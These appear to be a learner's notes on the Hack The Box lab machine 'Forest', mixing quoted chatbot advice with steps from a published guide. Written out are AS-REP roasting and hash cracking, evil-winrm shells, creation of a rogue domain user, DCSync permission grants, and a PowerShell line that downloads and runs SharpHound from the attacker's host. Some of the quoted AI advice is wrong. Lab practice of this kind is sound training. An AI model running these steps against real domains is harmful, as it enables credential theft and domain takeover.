	nmap -sS -sV 10.129.95.210 -oN nmap.txt

so, me being a noob, i've asked Z.AI what to focus on. and what my tools are.


### 1. What are you looking at?

- **OS:** Windows Server 2008 R2 - 2012.
- **Role:** Domain Controller (DC). Evidence: Ports 389 (LDAP), 88 (Kerberos), and 3268 (Global Catalog).
- **Hostname:** FOREST.
- **Domain:** `htb.local`.


### 2. Your Toolkit

Since this is an Active Directory (AD) environment, your standard Linux tools won't be enough. You need AD-specific enumeration tools.

- **SMB Enumeration:**
    - `enum4linux` (Great for quick checks)
    - `smbclient` (For listing shares and accessing files)
    - `crackmapexec` (For checking user access and SMB signing status)
- **LDAP Enumeration:**
    - `ldapsearch` (Built-in, powerful but verbose)
    - `windapsearch` (Python tool, much cleaner output for user enumeration)
    - `Bloodhound-python` (To gather data for Bloodhound analysis)
- **Kerberos Attacks:**
    - `GetNPUsers.py` (Part of Impacket; for AS-REP Roasting)
    - `GetUserSPNs.py` (Part of Impacket; for Kerberoasting)
- **Password Cracking:**
    - `hashcat` or `john`


cool. theres more ai output but im going to play around w the cli a bit.

lets use `nxc`.

```
┌──(henrypost㉿kali-toughwolf)-[~/…/oscp/boxes/htb/Forest]
└─$ nxc smb forest                                                                              
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)

```

wowie. enum4linux is really spammy.

okay ...z.ai sez:

This is excellent progress. You have successfully leveraged the **Null Session** to dump the user list. While `enum4linux` is indeed "spammy," you just struck gold.

Here is how to filter out the noise and what to focus on next.

### 1. Filter the Data (Create your User List)

You have a lot of users, but most of them (`HealthMailbox...` and `SM_...`) are service accounts created by Microsoft Exchange. They usually have random, complex passwords and are not worth brute-forcing.

**Copy these specific users into a file called `users.txt`:**
...see files.

2. The "Hidden Gem" in your output
Look closely at the Group Memberships section in your logs:

```
    Group: 'Service Accounts' (RID: 1148) has member: HTB\svc-alfresco
    Group: 'Privileged IT Accounts' (RID: 1149) has member: HTB\Service Accounts
```

This is huge.

1. svc-alfresco is a member of the group Service Accounts.
2. Service Accounts is a member of Privileged IT Accounts.
3. If you compromise svc-alfresco, you are effectively a member of "Privileged IT Accounts." This is likely your path to Domain Admin.

### 3. Next Step: AS-REP Roasting

Now that you have a clean list of users (`users.txt`) and a specific target (`svc-alfresco`), you need to check if any of these users have **Kerberos Pre-Authentication disabled**.

If they do, you can request a hash for their password without knowing their password.

**Run this command:**
    impacket-GetNPUsers htb.local/ -usersfile users.txt -dc-ip 10.129.95.210 -request
	
- **If successful:** You will get a hash like `$krb5asrep$...`.
- **If successful:** Save that hash to a file (e.g., `hash.txt`) and crack it with `hashcat` (Mode 18200).
- **If it fails:** It means pre-auth is enabled for everyone, and we move to the next step.


...cool thanks z.ai.

COOL!!! this password hash popped out. woop

```
                                                                                                                                                                       
┌──(henrypost㉿kali-toughwolf)-[~/…/oscp/boxes/htb/Forest]
└─$ impacket-GetNPUsers htb.local/ -usersfile users.txt -dc-ip 10.129.95.210 -request

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
$krb5asrep$23$svc-alfresco@HTB.LOCAL:4995433a65d657b759e554b16ce025a8$779316e55a7037366b5615909ad42841bebf4dad87bcdcfb7e7118f53649c26e4a01055a9de583d39173c65f4058f63b439d1ca07c8e9b6048c5696ec24a3fabcec5f608283b828de1f852873cfed34bba859530a7daf99daaa245c6ba6a234297db0d04719780ce4e7109d37031923b040a8a72fccc86d6c2df8482e190338601be83337cb07c9f4c03ce9ef3f9ea52d3b785e38e112dbc86d959f185e7bd3028c958b997dbbb18e9ea679ba04a9d81d68fc4614c96ded1b14c2e24d5c9a8146c591066e43d69ae9c6e09fe55e65f1332ace5407adb25275409be74d14f3251ca87a735031c
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set

```

    hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --show
    s3rvice

cool. s3rvice


nxc smb 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'


```
┌──(henrypost㉿kali-toughwolf)-[~/…/oscp/boxes/htb/Forest]
└─$ nxc smb 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.95.210   445    FOREST           [+] htb.local\svc-alfresco:s3rvice 

```

impacket psexec next???


oh okay.

so "winrm" lets us get shell. possibly. :)

    nxc winrm 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'

```
┌──(henrypost㉿kali-toughwolf)-[~/…/oscp/boxes/htb/Forest]
└─$ nxc winrm 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
WINRM       10.129.95.210   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.95.210   5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)

```

i guess yes??

yes. thx z.ai :)


    evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'

(pwns user flag)

so, neat. asking z.ai for advice again.

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /all

USER INFORMATION
----------------

User Name        SID
================ =============================================
htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```


z.ai output:

This is exactly what we needed to see.

**The Key Finding:** You are a member of **`BUILTIN\Account Operators`**.

In Active Directory, the **Account Operators** group is a low-privileged admin group. Its intended purpose is to allow helpdesk staff to create user accounts and reset passwords.

- **The Catch:** They usually **cannot** modify Administrators or Domain Admins.
- **The Opportunity:** They _can_ modify other groups and users, which often leads to Privilege Escalation.

Here is your two-pronged attack plan. We are going to try to abuse this membership.

..okay, back again..

we're going to use a "DCSync" attack. why?

> Even though you are just an Account Operator, sometimes permissions are misconfigured, and this group can request password hashes from the Domain Controller (a DCSync attack).


cool.


    impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.19.75 -just-dc-ntlm

???

so,

> No, you aren't missing a parameter. The error `ERROR_DS_DRA_BAD_DN` combined with the text "The distinguished name specified... is invalid" usually means **Permission Denied** in this context.


> ### The Fix: Abuse "Account Operators"
> Since you can't _steal_ the hashes directly, you must use your ability to _modify_ Active Directory objects.


okay.



```powershell

evil-winrm -i 10.129.19.75 -u 'svc-alfresco' -p 's3rvice'

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user h4ck3r P@ssw0rd123! /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" h4ck3r /add /domain
The command completed successfully.

    
```


sweet that was easy.

> Perfect. You now have a user (`h4ck3r`) inside the `Exchange Windows Permissions` group. This group has a special permission in Active Directory called **WriteDACL** on the Domain object itself.
> This means `h4ck3r` is allowed to change the security rules of the entire domain.

okay. epic.

```
### Step 2: Grant DCSync Rights

# We are going to tell Active Directory: _"Allow user `h4ck3r` to replicate directory changes (i.e., perform a DCSync)."_

pipx install bloodyad

┌──(henrypost㉿kali-toughwolf)-[~/Git/oscp]
└─$ bloodyAD --host 10.129.19.75 -d htb.local -u h4ck3r -p 'P@ssw0rd123!' add dcsync 'DC=htb,DC=local'       
[+] DC=htb,DC=local is now able to DCSync



# so, now we can dump secrets?
  impacket-secretsdump htb.local/h4ck3r:'P@ssw0rd123!'@10.129.19.75 -just-dc-ntlm                                                                             
# nope.

  impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.19.75 -just-dc-ntlm      
  
# get sid
  bloodyAD --host 10.129.19.75 -d htb.local -u h4ck3r -p 'P@ssw0rd123!' get object 'CN=h4ck3r,CN=Users,DC=htb,DC=local'                                              
# ● The h4ck3r SID is S-1-5-21-3072663084-364016917-1341370565-10101. Looking at the domain ACL, I don't see this SID with DCSync rights. The bloodyAD approach may not have worked as expected.
        
okay.

  Let's pivot to Kerberoasting - this is a classic AD attack that should yield results:
                                                                                                                                                                       
  impacket-GetUserSPNs htb.local/svc-alfresco:s3rvice@10.129.19.75 -request -outputfile kerberoast_hashes.txt                                                          

  This will request Kerberos service tickets for accounts with SPNs. Then crack the hash:

  hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

  OSCP Learning Point:
  - Kerberoasting - Accounts with SPNs (Service Principal Names) have Kerberos tickets that can be requested and cracked offline. Service accounts often have weak
  passwords.

  ---
  Alternatively, since we know the typical Forest box path, let's try a different ACL abuse with bloodyAD - give h4ck3r more direct permissions:

  bloodyAD --host 10.129.19.75 -d htb.local -u h4ck3r -p 'P@ssw0rd123!' add acl 'DC=htb,DC=local' h4ck3r 'Replicating Directory Changes All'

  Try either approach and let me know the results!
    


  impacket-GetUserSPNs htb.local/svc-alfresco:s3rvice@10.129.19.75 -dc-ip 10.129.19.75 -request -outputfile kerberoast_hashes.txt                                      
  (we needed to specify the domain controller IP.)                                                                              

```

see setspn-output.md

● Good find! This output shows only the Domain Controller (FOREST) has SPNs - no user/service accounts with SPNs are Kerberoastable. This is common in smaller AD      
  environments.                                                                                                                                                        
 
 - OSCP Learning Point: Not every AD domain has Kerberoastable accounts. If setspn -Q */* only shows machine accounts (HOST/xyz, ldap/xyz, etc.), Kerberoasting won't  work.


```

❯ *Evil-WinRM* PS C:\Users\svc-alfresco\Documents>   net group /domain                                                                                                 
                                                                                                                                                                   
                                                                                                                                                                       
  Group Accounts for \\                                                                                                                                                
                                                                                                                                                                       
  -------------------------------------------------------------------------------                                                                                  
  *$D31000-NSEL5BRJ63V7                                                                                                                                            
  *Cloneable Domain Controllers                                                                                                                                    
  *Compliance Management                                                                                                                                           
  *Delegated Setup                                                                                                                                                 
  *Discovery Management                                                                                                                                            
  *DnsUpdateProxy                                                                                                                                                  
  *Domain Admins                                                                                                                                                   
  *Domain Computers                                                                                                                                                
  *Domain Controllers                                                                                                                                              
  *Domain Guests                                                                                                                                                   
  *Domain Users                                                                                                                                                    
  *Enterprise Admins                                                                                                                                               
  *Enterprise Key Admins                                                                                                                                           
  *Enterprise Read-only Domain Controllers                                                                                                                         
  *Exchange Servers                                                                                                                                                
  *Exchange Trusted Subsystem                                                                                                                                      
  *Exchange Windows Permissions                                                                                                                                    
  *ExchangeLegacyInterop                                                                                                                                           
  *Group Policy Creator Owners                                                                                                                                     
  *Help Desk                                                                                                                                                       
  *Hygiene Management                                                                                                                                              
  *Key Admins                                                                                                                                                      

```

okay. we can now try to add our h4ck3r user to a few groups.

so. bloodhound would probably be the like. industrial solution, i think.

net group "Exchange Trusted Subsystem" h4ck3r /add /domain
net group "Group Policy Creator Owners" h4ck3r /add /domain

they worked. now to login with impacket and pwn root flag?

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>   net user h4ck3r /domain
 
User name                    h4ck3r
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/10/2026 10:34:27 AM
Password expires             Never
Password changeable          2/11/2026 10:34:27 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
                             *Group Policy Creator *Exchange Trusted Subs
The command completed successfully.

```


● h4ck3r doesn't have WinRM rights. Let's go straight to DCSync - the group membership should allow that:

	  impacket-secretsdump htb.local/h4ck3r:'P@ssw0rd123!'@10.129.19.75 -just-dc-ntlm 

    evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
    
    
okay. back again after a mess. i'm going to give up using z.ai, because it's not able to figure out what to do next, and just "cheat" and read the guide again.

https://0xdf.gitlab.io/2020/03/21/htb-forest.html

we have user blood, i think. yeah.

we had "null auth" enabled, which let us get a kerberos hash from the user svc-alfresco.

then we used uh. i don't know. some tool to convert the kerberoasted hash into a password,

then we used `evil-winrm` to get a shell as svc-alfresco.

then user blood.

https://0xdf.gitlab.io/2020/03/21/htb-forest.html


okay. this guy uses `dig` to query DNS.

    dig @10.129.95.210 htb.local
    # response: okay. using wireshark shows us that a DNS server is running on port 53.
    
    
    dig @10.129.95.210 forest.htb.local
    # same reply

he then immediately tries to do a DNS zone transfer (low hanging fruit) and fails.

..

he then tries to use `smbmap` and `smbclient` to enumerate the shares without a password. and fails.

                                                                                  
    ┌──(henrypost㉿kali-toughwolf)-[~]
    └─$ smbclient -N -L  //forest
    Anonymous login successful
    
   	Sharename       Type      Comment
   	---------       ----      -------
    Reconnecting with SMB1 for workgroup listing.
    do_connect: Connection to forest failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
    Unable to connect with SMB1 -- no workgroup available

and then uses some other CLI tool

    rpcclient -U "" -N forest
    enumdomusers
    (...list of users)
    enumdomgroups
    (...list of groups)


you can also look at an individual group

    querygroup    0x200
    querygroupmem 0x200

okay, so next up he says

"I'm going to try kerberoasting. It usually requires creds though. BUT, some accounts have `UF_DONT_REQUIRE_PREAUTH` which means "do not require kerberos preauthentication".

if we `enumdomusers` we get a bunch of users, and if we `enumdomgroups` we get a bunch of groups.

    for user in $(cat users.txt); do impacket-GetNPUsers -no-pass -dc-ip 10.129.95.210 htb/${user} | grep -v Impacket; done

(how does he generate users.txt  ???)
> I have a list of accounts from my RPC enumeration above. I’ll start without the SM* or HealthMailbox* accounts:

I feel like BloodHound is a better tool for this. I'm going to try to run it.

```
bloodhound-python -d htb -u Administrator -p 'Password123!' -dc 10.129.95.210
```

nevermind. we have to run bloodhound later when we have user blood.


    for user in $(cat users.txt); do impacket-GetNPUsers -no-pass -dc-ip 10.129.95.210 htb/${user} | grep -v Impacket; done
    
    
yep. this worked.
    [*] Getting TGT for svc-alfresco
    $krb5asrep$23$svc-alfresco@HTB:dcd17305cb99048d1ac4b92ee0ee596d$7ce5ac53de9985e222bd526a6869028ab2cf0e68368d479b31f358e60feab0b8eb93bdffd46af7b889ee2cd1a9aa1865070083468e9ccafec98f588046a89dbcc931dab5d25620ffe0be5b38e81609cab6294ca1ff2c8a12e9a7f65373bc370bcc58c2b836e0e8b87ec4e57d2f47c0b63e0c2cfb8f351f594c4faa06fbadc6d4b1ae478d82df744dcf0f1a7e64bf9b425e2812a07527b5781f338eb00cff87420c3c2a09dd791344b2b4e9f47c377479d6a3638bc27bd7e28c89fc779da6f4ca2c4eafa7571cad8c8b747e9ad5564cb8fd14c095a14978d6b1f2514b65972711

i guess manual `rpcclient` is a good thing to practice.

and we use hashcat to crack the hash.

    hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force
    hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force --show
    s3rvice

sweet. now, I think the guide loads SharpHound onto the victim user `svc-alfresco`.


victim needs to download `10.10.15.246:8000/SharpHound.ps1` and run it.

used `python3 -m http.server` to serve sharphound. yeah.

    evil-winrm -i forest -u 'svc-alfresco' -p 's3rvice'

    iex(new-object net.webclient).downloadstring("http://10.10.15.246:8000/SharpHound.ps1")
    # sweet, this worked, now I need to run the cmdlet commands to collect data.
    
    invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
    
    # okay, so maybe it didn't work. let me try to download the .ps1 as a file and not load it into memory.

    Invoke-WebRequest -Uri "http://10.10.15.246:8000/SharpHound.ps1" -OutFile "C:\Users\svc-alfresco\Desktop\SharpHound.ps1" -usebasicparsing
    
    cd ~/Desktop
    ./SharpHound.ps1
    invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice -OutputDirectory C:\Users\svc-alfresco\Desktop\

    # weird, no zip file. let me read the docs.
    # just read the source code. bingo! we needed `-OutputDirectory`.

    # now how do we get the .zip file?
    # okay, evil-winrm has a `download` command, that's pretty simple.
    
    download 20260216115235_BloodHound.zip /home/henrypost/Git/oscp/boxes/htb/Forest/bloodhoundresults.zip


cool now i just need to run bloodhound locally.

https://www.kali.org/docs/troubleshooting/postgresql-collation-mismatch-error/

    bloodhound-setup
    neo4j
    neo4j

okay cool.

"Find Shortest Paths to Domain Admin" is a saved query we should use.

okay. it works.

from guide:
> There’s two jumps needed to get from my current access as svc-alfresco to Administrator, who is in the Domain Admins group.


so, it goes:

    svc-alfresco
    service accounts
    privileged it accounts
    account operators
    windows exchange permissions
    htb.local
    users
    domain admins


so i need to use:

    net group "Exchange Windows Permissions" svc-alfresco /add /domain

and next, because "account operators" has "genericAll" onto "windows exchange permissions", I need to do this:

    $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', $SecPassword)
    Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync

ohhh....    Add-DomainObjectAcl is a "rotted" piece of code. It no longer exists.

According to people on reddit, 
https://www.reddit.com/r/hackthebox/comments/jq2ltl/forest_cant_run_adddomainobjectacl/

this does not work anymore. perhaps windows patched it/renamed that cmdlet?
well. let's consider Forest done and move on.
https://0xdf.gitlab.io/2020/03/21/htb-forest.html#alternative-tool-aclpwn

actually... let's try `aclpwn`.

    export DP=database_password_for_neo4j_goes_here
    pipx run aclpwn -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161 -du neo4j -dp $DP
    s3rvice


oh god okay.

spent an hour knee deep in `aclpwn` source code and...well, i'm not rewriting this guy's awesome but broken library for him..

let's give up on Forest and move on.
